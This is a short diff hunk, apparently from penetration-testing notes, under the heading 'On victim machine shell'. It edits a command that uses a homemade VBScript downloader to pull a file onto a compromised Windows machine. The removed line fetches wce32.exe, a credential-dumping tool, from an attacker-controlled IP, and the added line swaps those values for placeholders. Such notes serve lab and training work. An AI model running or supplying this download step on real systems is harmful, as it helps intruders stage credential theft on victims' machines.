@@ -236,7 +236,7 @@ On victim machine shell:
 	
 	echo ts.Close >> wget.vbs
 
-	cscript wget.vbs http://10.11.0.88/wce32.exe wce32.exe
+	cscript wget.vbs http://<[IP]>/<[FILE]> <[FILE_NAME]>
 
 
 
